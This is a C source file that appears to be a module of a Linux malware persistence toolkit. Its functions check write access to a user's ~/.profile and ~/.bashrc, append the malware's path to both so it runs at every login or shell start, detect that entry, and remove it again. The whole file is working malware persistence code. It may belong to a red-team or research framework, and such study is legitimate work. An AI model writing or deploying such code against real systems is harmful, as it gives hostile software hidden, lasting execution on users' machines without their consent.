#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "../../headers/modules/module.h"
#include "../../headers/helpers/helpers.h"
#include "../../headers/errors.h"

// Define files to be checked
#define             PROFILE_PATH                 ".profile"
#define             BASH_RC                      ".bashrc"

// Create a vector with them
const int count_files = 2;
const char* const checked_files[] = {PROFILE_PATH, BASH_RC};

extern int is_compatible(ENVIRONMENT *env){

	char *home_path = NULL;
	char *target_file_path = NULL;
	int i, ret_val;

	// Get home path
	get_user_home_directory(&home_path);

	// For each checked file
	for (i = 0; i < count_files; i++){

		// Get the full path
		concat_path_with_filename(&target_file_path, home_path, checked_files[i]);

		// Get privileges
		ret_val = has_privilege(target_file_path, WRITE);

		// Free the path and check the privileges 
		free(target_file_path);
		target_file_path = NULL;
		if (ret_val >= 0)
			break;

	}

	// Free allocated
	free(home_path);

	// Return
	return ret_val;

}

extern int exploit(ENVIRONMENT *env){

	FILE *checked_file;
	char *home_path = NULL;
	char *target_file_path = NULL;
	int i;

	// Get home path
	get_user_home_directory(&home_path);

	// For each checked file
	for (i = 0; i < count_files; i++){

		// Get the full path
		concat_path_with_filename(&target_file_path, home_path, checked_files[i]);

		checked_file = fopen(target_file_path, "a");
		if (checked_file != NULL){
			fprintf(checked_file, "%s\n", env->malware_path);
			fclose(checked_file);
		}

		// Free the path
		free(target_file_path);
		target_file_path = NULL;

	}

	// Free allocated
	free(home_path);

	// Return
	return 0;

}

extern int is_installed(ENVIRONMENT *env){

	char *home_path = NULL;
	char *target_file_path = NULL;
	char *content = NULL;
	int ret_val = 0;
	int i;

	// Get home path
	get_user_home_directory(&home_path);

	// For each checked file
	for (i = 0; i < count_files; i++){

		// Get the full path
		concat_path_with_filename(&target_file_path, home_path, checked_files[i]);

		// Get file content
		if (get_file_content(target_file_path, &content) >= 0){

			// Verify if string is present
			if (strstr(content, env->malware_path) != NULL){
				ret_val = 1;
			}

			free(content);
			content = NULL;

		}

		// Free the path
		free(target_file_path);
		target_file_path = NULL;

		// Check exit
		if (ret_val == 1)
			break;

	}

	// Free allocated
	free(home_path);

	// Return
	return ret_val;

}

extern int delete_installed(ENVIRONMENT *env){

	char *home_path = NULL;
	char *target_file_path = NULL;
	char *content = NULL;
	int ret_val = 0;
	int i;

	// Get home path
	get_user_home_directory(&home_path);

	// For each checked file
	for (i = 0; i < count_files; i++){

		// Get the full path
		concat_path_with_filename(&target_file_path, home_path, checked_files[i]);

		// Get file content
		if (get_file_content(target_file_path, &content) >= 0){

			// Replace the occurences
			remove_all_substring_occurences(content, env->malware_path);
			create_file(target_file_path, content);

			// Free the file content
			free(content);
			content = NULL;

		}

		// Free the path
		free(target_file_path);
		target_file_path = NULL;

		// Check exit
		if (ret_val == 1)
			break;

	}

	// Free allocated
	free(home_path);

	// Return
	return 0;

}